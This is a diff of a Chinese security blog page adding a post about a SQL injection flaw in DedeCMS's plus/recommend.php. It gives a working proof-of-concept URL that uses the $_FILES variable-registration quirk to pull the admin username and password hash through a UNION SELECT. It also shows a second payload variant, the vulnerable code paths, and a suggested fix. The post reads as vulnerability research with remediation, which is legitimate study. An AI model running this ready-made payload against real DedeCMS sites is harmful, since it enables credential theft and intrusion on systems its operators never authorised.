@@ -311,6 +311,212 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.evalshell.com/2017/08/19/dede-recommend-sqli/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="fengxuan">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://avatars1.githubusercontent.com/u/9276329?v=4&s=460">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="fengxuan's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/08/19/dede-recommend-sqli/" itemprop="url">dede_recommend_sqli dedecms /plus/recommend.php 注入漏洞</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-19T11:21:42+08:00">
+                2017-08-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/dedecms/" itemprop="url" rel="index">
+                    <span itemprop="name">dedecms</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/08/19/dede-recommend-sqli/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2017/08/19/dede-recommend-sqli/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="dedecms-plus-recommend-php-注入漏洞"><a href="#dedecms-plus-recommend-php-注入漏洞" class="headerlink" title="dedecms plus/recommend.php 注入漏洞"></a>dedecms plus/recommend.php 注入漏洞</h1><p>dedecms 全版本通杀的sql注入。起因还是因为sql语句没有过滤，配合全局变量注册漏洞导致一起注入。</p>
+<h2 id="利用-poc"><a href="#利用-poc" class="headerlink" title="利用(poc)"></a>利用(poc)</h2><pre><code>plus/recommend.php?action=&amp;aid=1&amp;_FILES[type][tmp_name]=\%27%20or%20mid=@`\%27`%20/*!50000union*//*!50000select*/1,2,3,(select%20CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`%20limit+0,1),5,6,7,8,9%23@`\%27`+&amp;_FILES[type][name]=1.jpg&amp;_FILES[type][type]=application/octet-stream&amp;_FILES[type][size]=4294
+</code></pre><h2 id="漏洞分析-principle"><a href="#漏洞分析-principle" class="headerlink" title="漏洞分析(principle)"></a>漏洞分析(principle)</h2><p>dedecms有全局变量注册，但是可以看到这个payload是使用了$_FILES变量，为什么要这样呢，我们看下recommonend.php中代码<br>16行到18行</p>
+<pre><code>if(isset($arcID)) $aid = $arcID;
+$arcID = $aid = (isset($aid) &amp;&amp; is_numeric($aid) ? $aid : 0);
+$type = (!isset($type) ? &quot;&quot; : $type);
+</code></pre><p>可以看到这个$aid是已经被过滤了的。</p>
+<p>而漏洞产生在第38行</p>
+<pre><code>$arcRow=$dsql-&gt;GetOne(&quot;SELECT s.*,t.* FROM `#@__member_stow` AS s LEFT JOIN `#@__member_stowtype` AS t ON s.type=t.stowname WHERE s.aid=&apos;$aid&apos; AND s.type=&apos;$type&apos;&quot;);
+</code></pre><p>这里是直接带入了，但是由于$aid已经降至被转化为整形。所以只能使用$type变量进行攻击,为什么不直接在url上使用type参数进行攻击，而是使用$_FILES变量的type的键呢。我一开始也想不通，自己测试了下，</p>
+<p>构造的payload:</p>
+<pre><code>/plus/recommend.php?action=&amp;aid=1&amp;type=1\%27%20or%20mid=1%20/*!50000union*//*!50000select*/1,2,3,(select%20CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`%20limit+0,1),5,6,7,8,9%23+
+</code></pre><p>打印出sql为下面的语句，</p>
+<pre><code>SELECT s.*,t.* FROM `#@__member_stow` AS s LEFT JOIN `#@__member_stowtype` AS t ON s.type=t.stowname WHERE s.aid=&apos;1&apos; AND s.type=&apos;1\\\&apos; or mid=1 /*!50000union*//*!50000select*/1,2,3,(select CONCAT(0x7c,userid,0x7c,pwd) from `#@__admin` limit 0,1),5,6,7,8,9# &apos;
+</code></pre><p>得到这样的sql，我们原来是想闭合type的一个单引号<code>s.type=&#39;1\\\\&#39;</code>这样，但是总是无法正常闭合，原来是织梦在全局变量注册的时候使用了转移单引号。</p>
+<pre><code>foreach(Array(&apos;_GET&apos;,&apos;_POST&apos;,&apos;_COOKIE&apos;) as $_request)
+{
+    foreach($$_request as $_k =&gt; $_v) 
+    {
+        if($_k == &apos;nvarname&apos;) ${$_k} = $_v;
+        else ${$_k} = _RunMagicQuotes($_v);
+    }
+}
+</code></pre><p>所以<code>s.type=&#39;1\\\&#39;</code> 这个是无法转移的。为什么使用了$_FILES变量就能转义呢？</p>
+<p>从include/uploadsafe.inc.php中第9－32行可以看到</p>
+<pre><code>$keyarr = array(&apos;name&apos;, &apos;type&apos;, &apos;tmp_name&apos;, &apos;size&apos;);
+if ($GLOBALS[&apos;cfg_html_editor&apos;]==&apos;ckeditor&apos; &amp;&amp; isset($_FILES[&apos;upload&apos;]))
+{
+    $_FILES[&apos;imgfile&apos;] = $_FILES[&apos;upload&apos;];
+    $CKUpload = TRUE;
+    unset($_FILES[&apos;upload&apos;]);
+}
+
+foreach($_FILES as $_key=&gt;$_value)
+{
+    foreach($keyarr as $k)
+    {
+    echo $_key . &quot;&lt;br/&gt;&quot;;
+    if(!isset($_FILES[$_key][$k]))
+    {
+        exit(&apos;Request Error!&apos;);
+    }
+}
+if( preg_match(&apos;#^(cfg_|GLOBALS)#&apos;, $_key) )
+{
+    exit(&apos;Request var not allow for uploadsafe!&apos;);
+}
+
+$$_key = $_FILES[$_key][&apos;tmp_name&apos;] = str_replace(&quot;\\\\&quot;, &quot;\\&quot;, $_FILES[$_key][&apos;tmp_name&apos;]);
+</code></pre><p>这里可以看到$_FILES遍历<code>&#39;name&#39;, &#39;type&#39;, &#39;tmp_name&#39;, &#39;size&#39;</code>这几个参数，而最重要的一点是<code>$$_key = $_FILES[$_key][&#39;tmp_name&#39;] = str_replace(&quot;\\\\&quot;, &quot;\\&quot;, $_FILES[$_key][&#39;tmp_name&#39;]);</code> 会将字符串中的<code>\\</code>号变为一个反斜杠然后注册为一个变量赋值，就刚好绕过了。所以才会造成攻击。</p>
+<p><img src="/uploads/images/dede_recommon/sqli.png" alt="recommon.php"></p>
+<h2 id="修复方案-repair"><a href="#修复方案-repair" class="headerlink" title="修复方案(repair)"></a>修复方案(repair)</h2><p>不要对字符串中的反斜杠进行替换</p>
+<pre><code>$$_key = $_FILES[$_key][&apos;tmp_name&apos;] =  $_FILES[$_key][&apos;tmp_name&apos;];
+</code></pre><h2 id="参考链接-link"><a href="#参考链接-link" class="headerlink" title="参考链接(link)"></a>参考链接(link)</h2><p><a href="http://0day5.com/archives/1349/" target="_blank" rel="external">http://0day5.com/archives/1349/</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://www.evalshell.com/2017/08/17/dede-guestbook-sqli/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -997,7 +1203,7 @@ if(isset($typeArr) &amp;&amp; is_array($typeArr))
           
             <div class="site-state-item site-state-posts">
               <a href="/archives/">
-                <span class="site-state-item-count">4</span>
+                <span class="site-state-item-count">5</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
